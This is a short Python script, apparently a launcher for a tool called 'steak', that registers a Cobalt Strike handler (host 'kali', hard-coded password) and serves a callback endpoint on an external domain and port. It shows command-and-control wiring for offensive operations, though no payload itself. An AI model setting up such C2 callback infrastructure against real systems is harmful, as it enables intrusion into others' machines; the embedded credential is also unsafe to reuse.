from steak import Steak
from steak.handlers import CobaltStrikeHandler
from DemoProject import DemoProject
if __name__=='__main__':
    steak=Steak()
    steak.add_handler(CobaltStrikeHandler(host='kali',password='1145141919810'))
    steak.add_project(DemoProject())
    steak.run(ip='coderunnerapp.com',port=8964,callbackpath='/callback')